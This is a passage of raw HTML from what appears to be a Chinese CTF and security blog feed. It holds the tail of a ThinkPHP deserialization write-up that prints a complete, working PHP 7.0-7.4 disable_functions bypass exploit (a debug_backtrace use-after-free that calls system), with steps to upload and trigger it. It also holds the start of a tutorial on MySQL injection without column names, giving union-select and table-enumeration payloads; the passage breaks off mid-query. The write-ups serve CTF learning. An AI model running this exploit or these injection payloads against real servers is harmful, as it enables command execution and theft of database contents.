class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">//将这里的命令改成/readflag即可</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着将其上传到**&#x2F;var&#x2F;www&#x2F;html&#x2F;runtime&#x2F;session&#x2F;<strong>下，即我这里的</strong>1.php**文件</p><p><img src="https://img-blog.csdnimg.cn/43402dfcef7141649193bbf7e3b01e14.png" alt="在这里插入图片描述"></p><p>之后在访问1.php文件即可获得flag</p><p><img src="https://img-blog.csdnimg.cn/0c50b621d95340479b2aee86be84f51c.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thinkphp </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无列名注入姿势总结</title>
      <link href="/2021/12/12/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
      <url>/2021/12/12/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="无列名注入姿势总结"><a href="#无列名注入姿势总结" class="headerlink" title="无列名注入姿势总结"></a>无列名注入姿势总结</h1><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>从学习安全以来，还未自己总结过，往往一时会了就不再理会，遇到相似的题的时候又冥思苦想才能回想起来，所以决定从今天开始，规律的对一些方法进行总结。</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>在<strong>mysql</strong>数据库中，<strong>information_schema</strong>数据库保存着mysql所有其他数据库的信息，包括了数据库名，表名，字段名等，而题目则会有意的过滤掉这个库，这时，我们就得利用其他手段来绕过。</p><h3 id="爆库名和表名"><a href="#爆库名和表名" class="headerlink" title="爆库名和表名"></a>爆库名和表名</h3><p><strong>其他库或者视图：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql：</span><br><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys：</span><br><span class="line">x$schema_table_statistics_with_buffer</span><br><span class="line">schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line">视图：</span><br><span class="line">schema_auto_increment_columns</span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from |mysql.innodb_table_stats|x$schema_table_statistics_with_buffer|schema_auto_increment_columns|.....|</span><br></pre></td></tr></table></figure><h3 id="取别名绕过列名查数据"><a href="#取别名绕过列名查数据" class="headerlink" title="取别名绕过列名查数据"></a><strong>取别名绕过列名查数据</strong></h3><p><strong>基本查询：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tp_user;</span><br><span class="line">+----------+----------+------+--------+</span><br><span class="line">| username | password | id   | status |</span><br><span class="line">+----------+----------+------+--------+</span><br><span class="line">| Tom      | 123      | 1    | 1      |</span><br><span class="line">| Bob      | 1234     | 2    | 2      |</span><br><span class="line">| Dam      | 12345    | 3    | 3      |</span><br><span class="line">| Tony     | a        | 4    | 4      |</span><br><span class="line">| Tony     | a        | 4    | 4      |</span><br><span class="line">| xi       | 123      | NULL | NULL   |</span><br><span class="line">+----------+----------+------+--------+</span><br></pre></td></tr></table></figure><p><strong>将列名转换为任何可选的已知值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3,4 union select * from tp_user;</span><br><span class="line">+------+-------+------+------+</span><br><span class="line">| 1    | 2     | 3    | 4    |</span><br><span class="line">+------+-------+------+------+</span><br><span class="line">| 1    | 2     | 3    | 4    |</span><br><span class="line">| Tom  | 123   | 1    | 1    |</span><br><span class="line">| Bob  | 1234  | 2    | 2    |</span><br><span class="line">| Dam  | 12345 | 3    | 3    |</span><br><span class="line">| Tony | a     | 4    | 4    |</span><br><span class="line">| xi   | 123   | NULL | NULL |</span><br><span class="line">+------+-------+------+------+</span><br></pre></td></tr></table></figure><p><strong>这样我们就可以用1，2，3，4来代替列名了：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select `1` from (select 1,2,3,4 union select * from tp_user) as 